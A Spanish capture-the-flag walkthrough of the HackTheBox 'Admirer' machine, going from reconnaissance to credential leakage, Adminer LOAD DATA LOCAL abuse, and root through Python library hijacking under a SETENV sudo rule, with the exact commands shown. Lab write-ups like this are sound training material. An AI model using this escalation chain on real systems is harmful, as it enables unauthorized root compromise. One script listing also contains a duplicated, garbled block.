---
title: Admirer | Linux
published: 2025-08-15
image: "./logo.png"
tags: [Easy, Linux, Information Leakage, Admirer explotation, Abusing Sudoers Privilege, eWPT, OSWE, OSCP]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Information Leakage
- Admirer Exploitation (Abusing LOAD DATA LOCAL Query)
- Abusing Sudoers Privilege [Library Hijacking - Python] (Privilege Escalation)

### Preparación

- eWPT
- OSWE
- OSCP

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.187 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.187`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p21,22,80 10.10.10.187 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.187`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
```

### Whatweb

Usamos el comando **whatweb** para ver más información:

```bash wrap=false
whatweb 10.10.10.187
http://10.10.10.187 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.187], JQuery, Script, Title[Admirer]
```

### Wfuzz

```bash wrap=false
❯ wfuzz -c --hc 404 --hw 529 -L -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.187/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                               
=====================================================================

000000291:   403        9 L      28 W       277 Ch      "assets"                                                                                                                                                                              
000000016:   403        9 L      28 W       277 Ch      "images"                                                                                                                                                                              
000095524:   403        9 L      28 W       277 Ch      "server-status"                                                                                                                                                                       

Total time: 91.96705
Processed Requests: 220559
Filtered Requests: 220556
Requests/sec.: 2398.239
```

Si fuzeamos por el directorio que nos muestra el reporte de nmap:

```bash wrap=false
❯ wfuzz -c --hc=404,403 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-html-txt http://10.10.10.187/admin-dir/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/admin-dir/FUZZ.FUZ2Z
Total requests: 661677

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                               
=====================================================================

000000681:   200        29 L     39 W       350 Ch      "contacts - txt"  
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FS0QQhvNIIiRGksst7JNs%2Fimage.png?alt=media&#x26;token=f1ecad95-d901-41fc-afab-e00377884a8d" alt=""><figcaption></figcaption></figure>

Haremos el diccionario más pequeño y preciso de la siguiente manera:

```bash wrap=false
grep -iE "user|name|pass|key|cred|secret|mail|db|config" /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt > ./content/custom_dic
```

| Parte                                                                               | Descripción                                                                                                                        |
| ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| `grep`                                                                              | Herramienta de búsqueda de texto en archivos.                                                                                      |
| `-i`                                                                                | Ignora mayúsculas/minúsculas al buscar (case-insensitive).                                                                         |
| `-E`                                                                                | Permite usar expresiones regulares extendidas (Extended Regex).                                                                    |
| `"user\|name\|pass\|key\|cred\|secret\|mail\|db\|config"`                           | Expresión regular que busca líneas que contengan cualquiera de estas palabras clave relacionadas con credenciales y configuración. |
| `/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Ruta del diccionario original de Seclists.                                                                                         |
| `>`                                                                                 | Redirecciona la salida a un archivo.                                                                                               |
| `./content/custom_dic`                                                              | Ruta y nombre del diccionario filtrado que se creará.                                                                              |

```bash wrap=false
❯ wfuzz -c --hc=404,403 -t 200 -w ./content/custom_dic -z list,php-html-txt http://10.10.10.187/admin-dir/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/admin-dir/FUZZ.FUZ2Z
Total requests: 8235

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                               
=====================================================================

000006273:   200        11 L     13 W       136 Ch      "credentials - txt"    
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FtwCZTIHc6akusk2XyJ0b%2Fimage.png?alt=media&#x26;token=a463a472-c9c2-49c8-af11-0bf5ddca393b" alt=""><figcaption></figcaption></figure>

### FTP (21)

Si nos conectamos por **FTP** a la máquina víctima encontraremos lo siguiente:

```bash wrap=false
ftp> dir
229 Entering Extended Passive Mode (|||52993|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
```

```sql title="dump.sql"
-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version       10.1.41-MariaDB-0+deb9u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `items`
--

DROP TABLE IF EXISTS `items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `thumb_path` text NOT NULL,
  `image_path` text NOT NULL,
  `title` text NOT NULL,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `items`
--

LOCK TABLES `items` WRITE;
/*!40000 ALTER TABLE `items` DISABLE KEYS */;
INSERT INTO `items` VALUES (1,'images/thumbs/thmb_art01.jpg','images/fulls/art01.jpg','Visual Art','A pure showcase of skill and emotion.'),(2,'images/thumbs/thmb_eng02.jpg','images/fulls/eng02.jpg','The Beauty and the Beast','Besides the technol>
/*!40000 ALTER TABLE `items` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-12-02 20:24:15
```

Aquí no vemos nada interesante, pero si descomprimimos el `html.tar.gz`, veremos una copia de la web que vemos:

```bash wrap=false
❯ ls
 assets   images   utility-scripts   w4ld0s_s3cr3t_d1r   index.php  ﮧ robots.txt
```

Podemos ver una ruta que desconocíamos:

```bash wrap=false
❯ cd utility-scripts
❯ ls
 admin_tasks.php   db_admin.php   info.php   phptest.php
```

### Adminer

Analizando los archivos no vemos nada vulnerable, pero en `db_admin.php` encontramos credenciales de base de datos. Adivinando por el nombre de la máquina, podemos pensar que existe la ruta `adminer`, que es un gestor de bases de datos.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F9GwvtKHNGuPXWWQuPMNC%2Fimage.png?alt=media&#x26;token=3b90dbdb-838f-4413-87ee-4ba5a385f8bf" alt=""><figcaption></figcaption></figure>

Efectivamente, pero después de haber probado las credenciales de ese archivo y de otras que encontramos en el `index.php`, no podemos acceder. Buscando otras vías, encontrarmos una vulnerabilidad: [http://foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](http://foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool).

Siguiendo los pasos, primero deberemos configurar nuestra base de datos local con la siguiente secuencia de comandos:

```bash wrap=false
❯ systemctl start mariadb
❯ sudo mariadb
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 11.8.2-MariaDB-1 from Debian -- Please help get to 10k stars at https://github.com/MariaDB/Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0,005 sec)

MariaDB [(none)]> create database Pwned;
Query OK, 1 row affected (0,000 sec)

MariaDB [(none)]> use Pwned;
Database changed
MariaDB [Pwned]> create user 'zelpro'@'10.10.10.187' identified by 'zelpro';
Query OK, 0 rows affected (0,004 sec)
MariaDB [Pwned]> grant all on Pwned.* to 'zelpro'@'10.10.10.187';
Query OK, 0 rows affected (0,004 sec)
MariaDB [Pwned]> create table data(output varchar(1024));
Query OK, 0 rows affected (0,011 sec)

❯ sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
-> bind-address            = 0.0.0.0

❯ systemctl restart mariadb
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fhc3TGZTpCZJZjjeU3wSx%2Fimage.png?alt=media&#x26;token=0c3d88a8-2781-48a9-aa42-955ef0cf2efa" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FfkmBmDyfq2PcZkSilHdv%2Fimage.png?alt=media&#x26;token=f1083754-849c-4c87-9695-474f5596e258" alt=""><figcaption></figcaption></figure>

Si probamos a conectarnos a la base de datos ahora, si que nos deja. Incluso probando por **SSH** también:

```bash wrap=false
❯ ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Permission denied, please try again.
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-19-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Thu Aug 24 16:09:42 2023 from 10.10.14.23
waldo@admirer:~$ whoami                                                                                                                                                                                                                               
waldo
waldo@admirer:~$ cat user.txt 
28bc182b55949a5a...
```

## Escalada de privilegios

Comenzaremos ejecutando el comando `sudo -l`:

```bash wrap=false
waldo@admirer:/opt/scripts$ sudo -l
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

```bash title="/opt/scripts/admin_tasks.sh"
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

```python title="/opt/scripts/backup.py"
#!/usr/bin/python3
from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

Podemos intentar aprovecharnos de una vulneriabilidad similar a un Path Hijacking, pero en este caso **Library Hijacking**. Python usa una serie de directorios para buscar las librerías que tiene que usar:

```bash wrap=false
waldo@admirer:/opt/scripts$ python -c 'import sys; print sys.path'
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
```

Podemos crearnos una librería falsa con el mismo nombre en `temp`:

```bash wrap=false
waldo@admirer:/tmp$ nano shutil.py
```

```python title="/tmp/shutil.py"
import os

os.system("chmod u+s /bin/bash")
```

Ahora con el siguiente comando, modificaremos el **path** de **python** de el usuario **root** gracias al permiso que vemos en `sudo -l` (`SETENV`):

```bash wrap=false
waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:/tmp$ Traceback (most recent call last):
  File "/opt/scripts/backup.py", line 3, in <module>
    from shutil import make_archive
ImportError: cannot import name 'make_archive'
```

Ahora si revisamos los permisos que tenemos para `/bin/bash`:

```bash wrap=false
waldo@admirer:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
```

Ahora tenemos permisos **SUID**. Por lo que podremos ejecutarlo como **root** con el comando `bash -p` que conserva los privilegios originales:

```bash wrap=false
waldo@admirer:/tmp$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# cat root.txt
f583b4cd06c25dae...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/248)

---